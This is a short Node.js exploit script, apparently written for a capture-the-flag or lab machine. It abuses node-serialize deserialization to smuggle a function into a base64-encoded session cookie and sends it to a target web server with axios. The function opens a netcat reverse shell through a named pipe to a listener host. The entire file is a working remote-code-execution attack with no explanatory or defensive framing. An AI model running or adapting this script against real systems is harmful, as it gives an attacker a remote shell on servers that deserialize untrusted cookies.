var serialize = require('node-serialize');
const { exec } = require('node:child_process')
const axios = require('axios')

x = {
test : function(){ const { execSync } = require('child_process'); return execSync("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.17.12.223 4488 >/tmp/f").toString(); }
};

var lized = serialize.serialize(x)
var objectValue = JSON.parse(lized);
var final = Buffer.from(objectValue['test']).toString() + '()'
// var final=Buffer.from(final+'()').toString('base64')

var obj =  {
	"email": final
}

rawPayload = JSON.stringify(obj)
payload = Buffer.from(rawPayload).toString('base64')
console.log(payload)



axios.request({
	url: "http://10.10.179.227/",
	method: "get",
	headers: 
	{
		Cookie: "session="+payload
	}
})
.then(res=>console.log(res.data))
.catch(err=>console.log(err))

console.log(payload)

